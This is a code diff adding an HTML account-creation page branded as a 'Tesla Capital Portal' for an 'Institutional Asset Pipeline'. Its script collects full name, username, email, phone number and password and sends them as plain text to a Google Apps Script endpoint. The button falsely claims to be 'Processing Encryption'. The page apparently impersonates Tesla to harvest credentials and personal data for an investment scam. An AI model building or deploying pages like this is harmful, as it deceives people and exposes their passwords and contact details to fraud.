@@ -1,1 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tesla Capital Portal - Create Account</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #0d0d0d; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    </style>
+</head>
+<body class="text-white min-h-screen flex items-center justify-center p-6">
 
+    <div class="max-w-md w-full space-y-6">
+        <div class="text-center">
+            <h1 class="text-3xl font-bold tracking-widest text-[#E82127]">TESLA</h1>
+            <p class="text-xs text-neutral-500 uppercase tracking-widest mt-2">Institutional Asset Pipeline</p>
+        </div>
+
+        <div class="bg-[#141414] border border-[#222] rounded-2xl p-6 shadow-2xl space-y-4">
+            <h2 class="text-lg font-medium text-neutral-200">Register Framework Account</h2>
+            
+            <div id="errorLog" class="hidden text-xs text-red-400 bg-red-950/40 border border-red-900/40 p-3 rounded-xl"></div>
+            <div id="successLog" class="hidden text-xs text-emerald-400 bg-emerald-950/40 border border-emerald-900/40 p-3 rounded-xl"></div>
+
+            <form id="signupForm" class="space-y-3.5">
+                <div>
+                    <label class="text-[10px] font-bold uppercase tracking-wider text-neutral-500 block mb-1">Full Name</label>
+                    <input type="text" id="fullName" required placeholder="John Smith" class="w-full bg-[#0d0d0d] border border-neutral-800 rounded-xl px-3 py-2.5 text-sm focus:outline-none focus:border-neutral-600 transition-colors text-neutral-200">
+                </div>
+                
+                <div>
+                    <label class="text-[10px] font-bold uppercase tracking-wider text-neutral-500 block mb-1">Username</label>
+                    <input type="text" id="username" required placeholder="jsmith99" class="w-full bg-[#0d0d0d] border border-neutral-800 rounded-xl px-3 py-2.5 text-sm focus:outline-none focus:border-neutral-600 transition-colors text-neutral-200">
+                </div>
+
+                <div>
+                    <label class="text-[10px] font-bold uppercase tracking-wider text-neutral-500 block mb-1">Email Address</label>
+                    <input type="email" id="email" required placeholder="john@example.com" class="w-full bg-[#0d0d0d] border border-neutral-800 rounded-xl px-3 py-2.5 text-sm focus:outline-none focus:border-neutral-600 transition-colors text-neutral-200">
+                </div>
+
+                <div>
+                    <label class="text-[10px] font-bold uppercase tracking-wider text-neutral-500 block mb-1">Phone Number</label>
+                    <input type="tel" id="phone" required placeholder="+1 (555) 000-0000" class="w-full bg-[#0d0d0d] border border-neutral-800 rounded-xl px-3 py-2.5 text-sm focus:outline-none focus:border-neutral-600 transition-colors text-neutral-200">
+                </div>
+
+                <div>
+                    <label class="text-[10px] font-bold uppercase tracking-wider text-neutral-500 block mb-1">Access Password</label>
+                    <input type="password" id="password" required placeholder="••••••••" class="w-full bg-[#0d0d0d] border border-neutral-800 rounded-xl px-3 py-2.5 text-sm focus:outline-none focus:border-neutral-600 transition-colors text-neutral-200">
+                </div>
+
+                <button type="submit" id="submitBtn" class="w-full bg-[#E82127] hover:bg-red-700 active:scale-[0.99] transition-all text-white font-semibold text-sm py-3 rounded-xl mt-2 shadow-lg">
+                    Create Portal Account
+                </button>
+            </form>
+        </div>
+
+        <div class="text-center">
+            <p class="text-xs text-neutral-500">Already verified? <a href="index.html" class="text-red-400 hover:underline">Log in here</a></p>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = "https://script.google.com/macros/s/AKfycbxMvLEjQRlW8Gveer2mNJf-bnoFsXLVb0wjNdcGkujWwnLVzTf2iDCQI19yVUTi0rtG5w/exec";
+
+        document.getElementById("signupForm").addEventListener("submit", async (e) => {
+            e.preventDefault();
+            
+            const errorLog = document.getElementById("errorLog");
+            const successLog = document.getElementById("successLog");
+            const submitBtn = document.getElementById("submitBtn");
+            
+            errorLog.classList.add("hidden");
+            successLog.classList.add("hidden");
+            submitBtn.innerText = "Processing Encryption...";
+            submitBtn.disabled = true;
+
+            const payload = {
+                action: "signup",
+                fullName: document.getElementById("fullName").value,
+                username: document.getElementById("username").value,
+                email: document.getElementById("email").value,
+                phone: document.getElementById("phone").value,
+                password: document.getElementById("password").value
+            };
+
+            try {
+                const response = await fetch(API_URL, {
+                    method: "POST",
+                    mode: "cors",
+                    headers: { "Content-Type": "text/plain" },
+                    body: JSON.stringify(payload)
+                });
+                
+                const result = await response.json();
+                
+                if (result.status === "success") {
+                    successLog.innerText = "Account established! Redirecting to secure terminal login...";
+                    successLog.classList.remove("hidden");
+                    setTimeout(() => {
+                        window.location.href = "index.html";
+                    }, 2000);
+                } else {
+                    errorLog.innerText = result.message;
+                    errorLog.classList.remove("hidden");
+                    submitBtn.innerText = "Create Portal Account";
+                    submitBtn.disabled = false;
+                }
+            } catch (err) {
+                errorLog.innerText = "Network handshaking failed. Check script configuration status.";
+                errorLog.classList.remove("hidden");
+                submitBtn.innerText = "Create Portal Account";
+                submitBtn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
